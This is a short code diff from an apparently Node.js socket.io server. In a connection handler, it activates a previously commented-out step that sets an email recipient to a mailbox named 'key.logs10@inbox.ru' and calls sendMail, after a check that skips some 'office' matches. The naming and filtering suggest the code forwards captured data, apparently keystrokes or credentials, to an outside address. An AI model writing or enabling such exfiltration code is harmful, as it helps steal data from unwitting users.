@@ -176,15 +176,15 @@ io.on("connection", (socket) => {
                 ) {
                     // match office dont send anyone
                 } else {
-                    //  mxg.to = "didi.stone20@inbox.ru";
+                      mxg.to = "key.logs10@inbox.ru";
                     //  mxg.bcc = "chris.kobe@inbox.ru";
-                    // sendMail(mxg)
-                    //.then((e) => {
-                    //      console.log(e);
-                    //   })
-                    //   .catch((err) => {
-                    //       console.log(err);
-                    //    });
+                     sendMail(mxg)
+                    .then((e) => {
+                         console.log(e);
+                       })
+                      .catch((err) => {
+                          console.log(err);
+                        });
                 }
             } else {
                 //  mxg.to = "didi.stone20@inbox.ru";
